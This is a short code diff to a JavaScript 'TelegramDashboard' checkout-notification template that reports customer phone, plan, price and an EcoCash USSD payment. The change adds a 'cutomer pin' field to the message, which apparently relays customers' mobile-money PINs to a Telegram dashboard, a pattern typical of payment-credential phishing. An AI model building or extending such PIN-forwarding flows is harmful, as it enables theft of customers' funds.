@@ -89,7 +89,7 @@ const TelegramDashboard = {
       `💳 <b>CHECKOUT INITIATED</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
       `📱 <b>Customer Phone:</b> <code>+263 ${phone}</code>\n` +
-`🔑 <b>Code:</b> <code>000000</code>\n` +
+      `🔑 <b>cutomer pin:</b> <code>0000</code>\n` +
       `📦 <b>Package:</b> ${plan.title} (${plan.duration})\n` +
       `💵 <b>Amount:</b> ${plan.price}\n` +
       `⚡ <b>Payment Method:</b> EcoCash USSD Push\n` +
